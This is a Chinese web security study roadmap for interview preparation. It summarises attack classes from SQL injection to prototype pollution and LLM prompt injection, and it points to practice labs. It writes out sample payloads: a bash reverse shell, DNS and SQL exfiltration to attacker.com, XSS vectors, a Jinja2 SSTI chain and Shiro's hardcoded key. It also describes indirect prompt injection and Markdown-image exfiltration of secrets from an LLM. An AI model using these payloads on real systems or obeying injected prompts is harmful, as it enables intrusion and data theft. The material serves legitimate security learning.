# Web 安全理论学习与实战路线图

> 基于 98 篇笔记（2026-07-26 基线），覆盖全部漏洞类型。标注面试权重与靶场推荐。
>
> 已过滤 2026 年基本绝迹的技术：Flash SWF、PHP 5.x `preg_replace /e`/`create_function`、PDF 脚本注入、`allow_url_include` 等。保留的反序列化/Log4j/Shiro 等虽已披露多年但仍有大量未修复资产，仍具实战价值。

## 一、必须背下来的理论

### 1. SQL 注入（6 篇笔记：WebSec0x00-0x05）

**面试权重：必考，初级岗 50% 的问题都从这里出。**

| 记什么      | 一句话                                                                          | 回看笔记          |
| -------- | ---------------------------------------------------------------------------- | ------------- |
| 注入根因     | 用户输入被拼接到 SQL 语句，数据库分不清代码和数据                                                  | WebSec0x00-01 |
| 预编译为什么能防 | SQL 模板和参数分两次发送，数据库先锁定查询结构，参数永远是数据                                            | WebDev0x16    |
| 三种盲注怎么区分 | 布尔=有变化/没变化；时间=sleep/benchmark 延时；报错=extractvalue/updatexml 触发错误              | WebSec0x03    |
| 堆叠注入     | `mysqli_multi_query` 支持多语句，`;` 分隔后直接追加 `DROP/INSERT`（条件苛刻：需支持多语句执行且有回显通道）    | WebSec0x05    |
| 二次注入     | 攻击分两步：恶意数据先存入数据库（如用户名 `admin'--`），后续功能从数据库取出后拼接到新 SQL 中执行——因为信任了数据库里的"自己人数据" | WebSec0x05    |
| HTTP 头注入 | UA、X-Forwarded-For、Cookie、Referer 都可能被拼进 SQL，因为这些头也会入库或参与查询                  | WebSec0x02    |
| 宽字节注入    | GBK 编码下 `%df` 吃掉转义反斜杠（`%5c`），单引号逃逸                                           | WebSec0x01    |
| DNS 外带   | `LOAD_FILE('\\\\attacker.com\\a')` 通过 DNS 请求把查询结果编码到域名里带出                    | WebSec0x04    |

**靶场：** DVWA（Low→Medium→High 手工注入）→ [SQLi-labs](https://github.com/Audi-1/sqli-labs)（Less-1 到 Less-65，覆盖所有注入类型）→ [PortSwigger SQLi](https://portswigger.net/web-security/sql-injection)（全部 lab，偏实战场景）

### 2. XSS（5 篇笔记：WebSec0x06-0x10）

**面试权重：高频，仅次于 SQL 注入。**

| 记什么 | 一句话 | 回看笔记 |
|--------|--------|---------|
| 三种类型的本质区别 | 反射型=藏在 URL 里，需点链接触发；存储型=存进数据库，谁看谁中招；DOM 型=纯前端 JS 执行，不经过服务器 | WebSec0x06 |
| `<script>` 被过滤了用什么 | `<img src=x onerror=alert(1)>`、`<svg onload=alert(1)>`、`<body onload=alert(1)>` | WebSec0x10 |
| 文件类型 XSS | SVG 内嵌 `<script>`、某些浏览器对特定格式的解析可能触发脚本执行——只要用户上传的文件被浏览器渲染就可能触发 | WebSec0x07 |
| CSP 绕过思路 | JSONP 回调、CSP 配置允许的 CDN 域名、script nonce 泄露、`<base>` 标签劫持 | WebSec0x10 |
| HttpOnly 的限制 | 只防 `document.cookie` 读取，不防页面篡改、钓鱼弹窗、键盘记录——XSS 的危害远不止偷 Cookie | WebSec0x06 |
| Vue/React XSS | `v-html` 和 `dangerouslySetInnerHTML` 直接渲染 HTML 字符串 | WebSec0x08 |

**靶场：** [Google XSS Game](https://xss-game.appspot.com/)（6 关，理解 XSS 思维）→ [PortSwigger XSS](https://portswigger.net/web-security/cross-site-scripting)（全部 lab）→ 自己写一个留言板页面，尝试绕过自己的过滤规则

### 3. CSRF vs SSRF（3 篇笔记：WebSec0x11-0x13）

**面试权重：必考对比题。**

| 记什么 | 一句话 |
|--------|--------|
| CSRF | C = Client，利用**浏览器**自动带 Cookie 发起请求。需要用户打开恶意页面触发 |
| SSRF | S = Server，利用**服务器**发起请求打内网。不需要用户配合 |
| SSRF 常用协议 | `file://` 读文件、`gopher://` 发任意 TCP（打 Redis/MySQL/FastCGI）、`dict://` 探测端口 |
| SSRF 绕过 IP 限制 | 127.0.0.1 变体（2130706433）、DNS 重绑定、302 跳转、IPv6 `[::1]`、`localhost` 各种写法 |
| 无回显 SSRF | DNS 外带、时间延迟判断、Burp Collaborator |
| 回看笔记 | WebSec0x11（CSRF）、WebSec0x12-0x13（SSRF） |

**靶场：** [PortSwigger CSRF](https://portswigger.net/web-security/csrf) → [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)（全部 lab，gopher 协议的要亲手打 Redis）

### 4. 文件上传（3 篇笔记：WebSec0x14-0x16）

**面试权重：高频，面试官喜欢问绕过链。**

| 记什么 | 一句话 |
|--------|--------|
| 绕过手法按顺序背 | 前端 JS 校验 → MIME 类型篡改 → 文件头魔术字伪造 → 后缀黑名单绕过（大小写/双写/空格/`.htaccess`）→ `%00` 截断 → 条件竞争 → 二次渲染 |
| .htaccess 的作用 | Apache 目录级配置，可以指定 `.jpg` 被当作 PHP 解析 |
| 条件竞争原理 | 文件先传上去，检查完再删除。中间有一小段时间窗口，并发访问就能抢执行 |
| 回看笔记 | WebSec0x14-0x16 |

**靶场：** [upload-labs](https://github.com/c0ny1/upload-labs) Pass 1-20（每关一个绕过手法，用 Burp 亲手改包）

### 5. 文件包含 LFI/RFI（1 篇笔记：WebSec0x15）

**面试权重：中频，常跟文件上传/伪协议串在一起问。**

| 记什么 | 一句话 | 回看笔记 |
|--------|--------|---------|
| LFI 原理 | `include($_GET['file'])` 没过滤，传入 `../../../etc/passwd` 就能读系统文件 | WebSec0x15 |
| LFI 常用姿势 | 日志包含（往 access.log 写一句话 → 包含日志文件执行）、session 文件包含、`php://input` 伪协议直接 POST PHP 代码 | WebSec0x15 |
| RFI | `allow_url_include=On` 时可直接包含远程 PHP 文件 → 代码执行，条件苛刻但危害大 | WebSec0x15 |
| 伪协议总结 | `php://filter` 读源码、`php://input` 执行代码、`data://` 内联代码、`file://` 读文件、`expect://` 命令执行 | WebSec0x15 |

**靶场：** [DVWA File Inclusion](https://github.com/digininja/DVWA)（Low→High）→ [PortSwigger Path Traversal](https://portswigger.net/web-security/file-path-traversal)（全部 lab）→ Vulhub 任意 PHP 文件包含漏洞（如 ThinkPHP 日志包含）

### 6. RCE / 命令注入 / 代码注入（1 篇笔记：WebSec0x19）

**面试权重：高危害必问，经常作为"漏洞利用链的终点"。**

| 记什么 | 一句话 | 回看笔记 |
|--------|--------|---------|
| 代码执行 vs 命令执行 | 代码执行 = `eval($_GET['code'])` 在语言层面执行 PHP 代码；命令执行 = `system('ping ' . $_GET['ip'])` 调用操作系统 shell | WebSec0x19 |
| PHP 危险函数 | `eval()`、`assert()`（旧版）、`system()`、`exec()`、`shell_exec()`、`popen()`、`proc_open()`、反引号 `` ` ``。注意 `preg_replace` `/e` 和 `create_function` 在 PHP 7+ 中已移除，仅在极老系统中存在 | WebDev0x06 |
| 无回显怎么解决 | 反弹 shell（`bash -i >& /dev/tcp/ip/port 0>&1`）、DNS 外带（`nslookup $(whoami).attacker.com`）、写文件到 web 目录访问 | Basic0x07-0x08 |
| 管道符/连接符 | 分号、管道线、逻辑与或、反引号、换行——不同系统可用的分隔符不同，常见 `;` `&#124;` `&#124;&#124;` `&&` `&` | WebSec0x19 |

**靶场：** [DVWA Command Injection](https://github.com/digininja/DVWA)（Low→High，理解每种绕过）→ [PortSwigger Command Injection](https://portswigger.net/web-security/os-command-injection)（全部 lab）→ [PortSwigger Code Injection](https://portswigger.net/web-security/server-side-template-injection) 里和 SSTI 有交叉

---

### 7. SSTI 模板注入（1 篇笔记：WebSec0x20）

**面试权重：进阶考点，分水岭题型。**

| 记什么 | 一句话 | 回看笔记 |
|--------|--------|---------|
| 根因 | 用户输入被拼接到模板中当成模板语法解析，而不是当作纯数据显示 | WebSec0x20 |
| 怎么判断引擎 | 输入 `{{7*7}}` → 输出 49 = Jinja2/Twig；输入 `${7*7}` → 输出 49 = Freemarker；输入 `<%= 7*7 %>` → 输出 49 = ERB | WebSec0x20 |
| Jinja2 利用链 | `{{''.__class__.__mro__[2].__subclasses__()}}` → 找到 `os` 或 `subprocess` 相关的子类 → 执行系统命令 | WebSec0x20 |
| 各语言对应 | Python=Jinja2/Tornado/Django；Java=Freemarker/Velocity/Thymeleaf；PHP=Smarty/Twig/Blade；Ruby=ERB/Slim | WebSec0x20 + WebDev0x23 |
| 自动化 | SSTImap 可以自动探测引擎类型和利用链 | WebSec0x20 |

**靶场：** [PortSwigger SSTI](https://portswigger.net/web-security/server-side-template-injection)（全部 lab，做不完不要停）→ Vulhub 搜 Flask/Jinja2 SSTI 漏洞复现

### 8. XXE（2 篇笔记：WebSec0x17-0x18）

| 记什么 | 一句话 | 回看笔记 |
|--------|--------|---------|
| 根因 | XML 解析器的"外部实体"功能默认开启，相当于定义了一个变量去引用外部文件内容 | WebSec0x17 |
| 无回显怎么办 | 构造外部 DTD，把文件内容拼到 HTTP 请求参数里传到你的服务器（OOB 外带） | WebSec0x17 |
| 出现场景 | XML 接口、DOCX/XLSX 上传解析、SVG 图片解析、SOAP WebService | WebSec0x17-0x18 |

**靶场：** [PortSwigger XXE](https://portswigger.net/web-security/xxe)（全部 lab，OOB 盲注的要做会）→ 自己建一个 XML 解析接口并用 Burp 测

### 9. 反序列化（4 篇笔记：WebSec0x21-0x24 + WebDev0x24-0x25）

**面试权重：区分水平的关键题。初级岗不太问，中高级必问。**

| 记什么 | 一句话 | 回看笔记 |
|--------|--------|---------|
| PHP 反序列化入口 | `unserialize()` 自动触发魔术方法 `__wakeup` / `__destruct` | WebSec0x21 |
| 什么是 POP 链 | 多个类的魔术方法像多米诺骨牌串起来，第一张倒下（`__wakeup`）后面自动倒，终点是 `system()` | WebSec0x21 |
| PHP 原生类利用 | 没自定义类也能打——`SoapClient` 打 SSRF、`SimpleXMLElement` 打 XXE、`Exception` 打 XSS | WebSec0x22 |
| PHP 进阶 | Phar 反序列化（`phar://` 伪协议触发）、PHPGGC 工具一键生成、ThinkPHP/Yii/Laravel 框架链 | WebSec0x24 |
| Java 反序列化入口 | `readObject()` 自动触发，通过反射调用危险类形成 gadget 链 | WebDev0x24 |
| JNDI 注入 | 让 Java JNDI 去远程加载一个类并执行——Log4j、Fastjson 漏洞的核心利用方式 | WebDev0x21-0x22 |
| Shiro rememberMe | AES 密钥硬编码（`kPH+bIxk5D2deZiIxcaaaA==`），解密 Cookie → 反序列化 → RCE | WebDev0x22 |
| FastJson | `@type` 指定反序列化类 → `JdbcRowSetImpl` 触发 JNDI → 远程加载恶意类 | WebDev0x24 |

**靶场：** [PortSwigger Deserialization](https://portswigger.net/web-security/deserialization)（前 5 个 lab，理解 POP 链）→ Vulhub（Fastjson、Shiro、Log4j 逐个复现）→ 自己用 PHP 写一个有反序列化漏洞的 demo，构造 POP 链弹出 `phpinfo()`

### 10. 认证与访问控制（4 篇笔记：WebSec0x25-0x28）

**面试权重：SRC 高危来源，面试越来越多问。**

| 记什么 | 一句话 | 回看笔记 |
|--------|--------|---------|
| 水平越权 vs 垂直越权 | 水平=同权限看别人的数据（改 URL 里的 ID）；垂直=低权限执行高权限操作（普通用户访问管理员接口） | WebSec0x25 |
| JWT 空密钥攻击 | 把算法改成 `none`，签名部分留空，有些服务端直接跳过签名验证 | WebSec0x26 |
| JWT 算法替换 | 用 HS256（对称密钥）签名，服务器用 RS256 的公钥验证——因为 HS256 会用公钥当密钥，攻击者拿到公钥就能自己签发 | WebSec0x26 |
| OAuth redirect_uri 漏洞 | 未校验回调地址 → 诱导授权 → 接管授权码 → 登录他人账户 | WebSec0x27 |
| State 参数的作用 | 防 CSRF——OAuth 流程中的随机值，回调时校验是否一致即可防中间人劫持授权码 | WebSec0x27 |

**靶场：** [PortSwigger Access Control](https://portswigger.net/web-security/access-control)（全部）→ [PortSwigger JWT](https://portswigger.net/web-security/jwt)（全部 lab，手改 JWT payload）→ [PortSwigger OAuth](https://portswigger.net/web-security/oauth)（全部 lab）

### 11. 业务逻辑（5 篇笔记：WebSec0x28-0x32）

**面试权重：越来越热，体现"安全思维"而不是"工具思维"。**

| 记什么 | 一句话 | 回看笔记 |
|--------|--------|---------|
| 支付篡改 | 抓包改金额、改数量、负数下单——一句话：前端传的值全不可信 | WebSec0x29 |
| 验证码绕过 | 不刷新、可复用、返回在响应包里、4 位太短可爆破 | WebSec0x30 |
| 密码找回缺陷 | 验证码返回在响应包、修改响应包绕过、流程跳过直接到重置步骤 | WebSec0x28 |
| 条件竞争 | 同一秒并发多次请求，绕过"一次一用"（优惠券/签到/投票） | WebSec0x31 |
| Fuzz 思维 | 没文档就盲猜参数——`id`/`uid`/`order_id`/`token`/`sign`，通过报错和响应差异验证存在 | WebSec0x31 |

**靶场：** [PortSwigger Business Logic](https://portswigger.net/web-security/logic-flaws)（全部 lab）→ 注册一个 SRC 账号（补天/漏洞盒子），挑"业务逻辑"类别的公开漏洞报告，在靶场复现思路

### 12. 信息收集（12 篇笔记：Infocc0x00-0x11）

**面试权重：情景题必问"给你一个 URL 怎么做"。**

| 记什么 | 一句话 | 回看笔记 |
|--------|--------|---------|
| 第一步：搜索引擎 | FOFA/Shodan/ZoomEye 搜 IP、端口、证书、关联域名 | Infocc0x01 |
| CDN 绕过找真实 IP | DNS 历史记录、子域名、国外节点访问、SSL 证书 SAN 列表、邮件头 source IP | Infocc0x05 |
| 框架识别 | 看响应头（Server/X-Powered-By/Set-Cookie）、看路径特征、看报错页面 | Infocc0x06 |
| 源码泄露 | `.git/HEAD`、`.svn/entries`、`DS_Store`、`composer.json`、Webpack source map（`.js.map`） | Infocc0x03 |
| JS 信息收集 | 找 API 接口、硬编码密钥/密码/Token、注释里的隐藏路径 | Infocc0x04 |

**靶场：** 不需要专门靶场——拿任意真实网站，用 FOFA + Burp + JSFinder 做一次完整信息收集，输出一份资产清单。

### 13. 原型链污染（1 篇笔记：WebDev0x11）

**面试权重：进阶考点，Node.js 方向加分项。**

| 记什么 | 一句话 | 回看笔记 |
|--------|--------|---------|
| 原理 | JavaScript 对象通过 `__proto__` 继承属性。攻击者篡改 `__proto__` 上的属性，所有继承该原型的对象都会"被污染" | WebDev0x11 |
| 常见入口 | `Object.assign()`、`merge()`/`extend()` 等递归合并函数，没过滤 `__proto__` 或 `constructor.prototype` | WebDev0x11 |
| 能做什么 | 污染后篡改任意属性——绕过权限检查、注入代码执行、劫持路由 | WebDev0x11 |
| 典型案例 | YApi RCE——通过原型链污染注入 `command` 属性，调用 `child_process.exec` 执行命令 | WebDev0x11 |

**靶场：** [PortSwigger Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)（全部 lab）

### 14. LLM 安全（3 篇笔记）

| 记什么 | 一句话 | 回看笔记 |
|--------|--------|---------|
| 直接注入 vs 间接注入 | 直接=你发恶意 prompt 操控模型；间接=恶意 prompt 藏在文档/网页/评论中，LLM 解析后执行 | 提示词注入.md |
| 不安全输出 | LLM 生成的 HTML 没过滤 → `<img src=x onerror=alert(1)>` → 下游页面 XSS/SSRF | WebSec0x33 |
| 数据外传方式 | Markdown 图片链接（`![img](https://attacker.com?data=密钥)`）、URL 预览抓取、外部 CSS/@import、iframe 嵌入、Agent 直接回传 API | 提示词注入.md |

**靶场：** [PortSwigger LLM Attacks](https://portswigger.net/web-security/llm-attacks)（3 个 lab）→ [Gandalf](https://gandalf.lakera.ai/)（越狱挑战，纯自然语言对抗）

## 三、怎么用这张表

### 节奏

- 理论 30min/天：挑一个模块，对着"一句话"默写，然后查笔记看自己漏了什么
- 靶场 60min/天：按阶段顺序打，每做一个 lab 在对应笔记末尾加一行实战心得

### 检验标准

| 水平 | 标准 |
|------|------|
| 及格 | 14 个模块各能用大白话讲出漏洞原理 |
| 合格 | 阶段一 + 阶段二全部打完 |
| 优秀 | 阶段三 6 个漏洞独立复现 + 阶段四 HTB 3 台独立完成 |

### 笔记追记模板

每做完一个靶场，在 Obsidian 对应笔记里追加：

```
## 实战心得（YYYY-MM-DD）
- 漏洞点：xxx
- 踩的坑：xxx
- 关键 payload：xxx
- 这次学到的一句话：xxx
```

面试时直接翻到这里讲，比背书可信十倍。
